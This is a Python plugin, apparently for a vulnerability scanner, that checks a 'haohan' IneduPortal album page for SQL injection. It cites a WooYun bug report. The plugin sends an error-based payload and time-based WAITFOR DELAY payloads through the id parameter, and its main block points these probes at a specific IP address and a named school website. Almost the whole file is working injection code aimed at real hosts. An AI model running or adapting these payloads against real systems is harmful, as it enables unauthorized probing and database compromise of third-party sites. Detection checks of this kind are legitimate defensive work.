#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0128557


import time

  

def assign(service, arg):
    if service == "haohan":
        return True, arg
        
        
        
def audit(arg):
    payload = 'IneduPortal/Components/albums/AlbumShow.aspx?id=1'
    getdata = '%20and%20db_name%281%29%3E1--'
    code, head, res, errcode, _ = curl.curl2(arg+payload+getdata)
    if code == 500 and 'master' in res:
        security_hole(arg + payload + "   :sql Injection")
        return
    
    
    getdata1 = '%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--%0A'
    getdata2 = '%3BWAITFOR%20DELAY%20%270%3A0%3A0%27--%0A'
    t1 = time.time()
    code, head, res, errcode, _ = curl.curl2(arg+payload+getdata1)
    t2 = time.time()
    code, head, res, errcode, _ = curl.curl2(arg+payload+getdata2)
    t3 = time.time()
    if code == 200 and (2*t2 - t1 - t3 > 3):
        security_hole(arg + payload + "   :sql Injection")



if __name__ == '__main__':
    from dummy import *
    audit(assign('haohan','http://115.236.188.35/')[1])
    audit(assign('haohan','http://www.fhschool.net/')[1])